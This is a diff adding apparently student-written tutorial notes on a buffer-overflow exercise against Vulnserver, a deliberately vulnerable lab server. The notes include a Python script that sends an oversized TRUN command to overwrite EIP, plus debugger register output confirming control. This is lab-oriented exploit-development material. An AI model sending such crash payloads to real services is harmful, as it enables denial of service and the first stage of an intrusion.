@@ -1,0 +1,34 @@
+So in previous class we got to know ehat was an offset to perform the Buffer Overflow attack. So, now we are going to overwrite the EIP inorder to perform an attack.
+According to the previous class we came  to know that offset was at 2003 bytes and what that means was we are having 2003 bytes to get the EIP and the EIP was itself a 4 bytes long. Now, here we're going to do was just Overwriting those 4 specific bytes.
+Now, to perfrom it we have to get our vulnserver and debugger ready then we move to our kali linux system.
+Open the last python script which was 2.py and then we are going to start.
+---------------------------------------------------
+edit 2.py:-
+--------------
+#!/usr/bin/python
+import sys, socket
+
+#remove/ replace offset with shellcode
+shellcode = "A"  *  2003  +  "B"  *  4
+
+try:
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(('192.168.1.90',9999))
+	s.send(('TRUN /.:/'  +  shellcode))
+	s.close()
+except:
+	print "Error connecting to server"
+	sys.exit()
+---------------------------------------------------
+now, execute the program which we wrote such as 2.py and the see the IMMUNITY DEBUGGER and Vulnserver. So as we can see that the immunity debugger was just crash and it shows somethig as paused with some message such as Access Violation. So, it means that our program got executes.
+NOTE: In order to perfrom this make sure that the IMMUNITY DEBUGGER was running with good health. Then execute this program.
+
+So, please see at the Registers windows that was present in the IMMUNITY DEBUGGER window.
+Now, here in the Registers window we need to see each & every line for clariffication 
+
+EBP	41414141
+EIP	42424242
+
+As you see that the EIP was having 42424242 like that so that mean that we had some control over the EIP which we want and the we have to do some couple of things in order to gain root previllages.
+
+So here we have to do something such as finding the bad characters that will help us to gain root access to perform the attack.
